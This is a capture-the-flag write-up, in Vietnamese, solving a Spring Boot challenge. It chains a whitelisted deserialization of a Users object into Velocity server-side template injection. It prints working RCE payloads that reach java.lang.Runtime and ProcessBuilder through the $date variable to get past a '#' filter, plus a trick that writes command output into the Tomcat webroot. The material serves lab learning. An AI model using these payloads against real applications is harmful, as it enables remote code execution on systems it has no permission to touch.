![image](https://github.com/user-attachments/assets/8c07037a-a4c8-4ffb-973b-9ff00cec3774)

Đề cho một web được viết bằng java springboot. Đọc source thì thấy trang trủ chấp nhận method `POST` với tham số là data. Decode hex và base64 rồi deserialize thành class User. Sau đó chuyền biến `name` vào template Velocity.

```java
public String hello(@RequestParam("data") String data) throws IOException {
        String hexString = new String(Base64.getDecoder().decode(data));
        byte[] byteArray = Encode.hexToBytes(hexString);
        ByteArrayInputStream bis = new ByteArrayInputStream(byteArray);
        ObjectInputStream ois = new SecureObjectInputStream(bis);

        String name;
        try {
            Users user = (Users)ois.readObject();
            name = user.getName();
        } catch (Exception var13) {
            Exception e = var13;
            throw new RuntimeException(e);
        }

        if (name.toLowerCase().contains("#")) {
            return "But... For what?";
        } else {
            String templateString = "Hello, " + name + ". Today is $date";
            Velocity.init();
            VelocityContext ctx = new VelocityContext();
            LocalDate date = LocalDate.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("MMMM dd, yyyy");
            String formattedDate = date.format(formatter);
            ctx.put("date", formattedDate);
            StringWriter out = new StringWriter();
            Velocity.evaluate(ctx, out, "test", templateString);
            return out.toString();
        }
    }
```

Nhìn qua có thể thấy bị dính SSTI, việc cần làm bây giờ là phải truyền payload vào biến name để rce. Nhưng gặp phải một vấn đề là lúc `readObjec()`, method `resolveClass` trong class `SecureObjectInputStream` sẽ gọi đến  
```java
    protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException ,ClassNotFoundException{
        List<String> approvedClass = new ArrayList<String>();
        approvedClass.add(Users.class.getName());

        if(!approvedClass.contains(osc.getName())){
            throw new InvalidClassException("Can not deserialize this class! ",osc.getName());
        }
        return super.resolveClass(osc);
    }
```
Method này kiểm tra xem class có method `getName` hay không. Sau đó kiểm tra trong biến `name` có chứa ký tự `#` không. Trước hết ta viết code để serialize class `User` đã.
```java
    public static String bytesToHex(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            String hex = Integer.toHexString(0xFF & b);
            if (hex.length() == 1) hexString.append('0'); // Thêm '0' nếu cần
            hexString.append(hex);
        }
        return hexString.toString();
    }
    public static void main(String[] args) {
        Users u = new Users();
        try {
            ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
            ObjectOutputStream out = new ObjectOutputStream(byteOut);
            u.setName("payload");
            out.writeObject(u);
            out.close();
            String hexString = bytesToHex(byteOut.toByteArray());
            String base64Encoded = Base64.getEncoder().encodeToString(hexString.getBytes());
            System.out.println("Serialized and Base64 encoded string: " + base64Encoded);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```
![image](https://github.com/user-attachments/assets/7d8d27a1-595d-4a17-88ec-9c8fa6c662a2)

Do không thể sử dụng ký tự `#` nên ta không thể dùng hàm `#set()` để tạo các biến trong template `Velocity`. Việc tạo ra biến để có thể gọi tới class `java.lang.Runtime` nhằm mục đích rce. Ví dụ
```
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat%20/flag563378e453.txt"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor() )
#foreach($i+in+[1..$out.available()])
$out.read()
#end
```

Thật may là trong source code có tạo sẵn biến `$date` với kiể String để lấy ra thời gian 

```java
VelocityContext ctx = new VelocityContext();
            LocalDate date = LocalDate.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("MMMM dd, yyyy");
            String formattedDate = date.format(formatter);
            ctx.put("date", formattedDate);
```
Ta có thể tận dụng biến này để gọi tới class `java.lang.Runtime`. Ban đầu thì mình tìm được [payload](https://garck3h.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/)

```
$date.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('touch /tmp/1337')
```
Nhưng payload này chỉ có thể thực thi câu lệnh và gửi thông tin tiến trình về thực thi command

![image](https://github.com/user-attachments/assets/e5a0b970-c802-46c8-9d6e-76599522b687)

![image](https://github.com/user-attachments/assets/b0d39acb-7bef-4487-8d8d-21f48de4a834)

Nếu làm theo cách này thì ta có thể ghi output command vào webroot. Trong Springboot thì để xuất hiện webroot, ta cần đưa file vào thư mục: /tmp/tomcat-docbase.8080...., mỗi lần deploy thì giá trị đằng sau sẽ là các ký tự khác, nhưng prefix đằng trước sẽ luôn là tomcat-docbase.8080..

Mình thử tạo một file trên webroot 

![image](https://github.com/user-attachments/assets/ad3431e5-c989-4d04-a905-8654c87c4c9d)

Và truy cập thử thì có thể thấy được nội dung file 

![image](https://github.com/user-attachments/assets/946f390d-2b57-4139-8d71-62b878f2326a)

Như vậy chỉ cần thay payload thành
```
$date.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('ls / > /tmp/$(ls /tmp | grep tomcat-docbase)/test1')
```
![image](https://github.com/user-attachments/assets/910bcce3-d689-4e15-82a7-9dc9972ca997)

![image](https://github.com/user-attachments/assets/98e7217a-c724-47dc-8723-d4937c5a5fae)

Giờ chỉ việt cat flag là xong


Lúc sau mình có tìm thêm được payload khác có thể xem output của shell luôn
```
$date.getClass().forName("java.io.BufferedReader").getConstructor($date.getClass().forName("java.io.Reader")).newInstance($date.getClass().forName("java.io.InputStreamReader").getConstructor($date.getClass().forName("java.io.InputStream")).newInstance($date.getClass().forName("java.lang.ProcessBuilder").getConstructor($date.getClass().forName("java.util.List")).newInstance(["ls","/"]).start().getInputStream())).lines().collect($date.getClass().forName("java.util.stream.Collectors").joining("\n"))
```

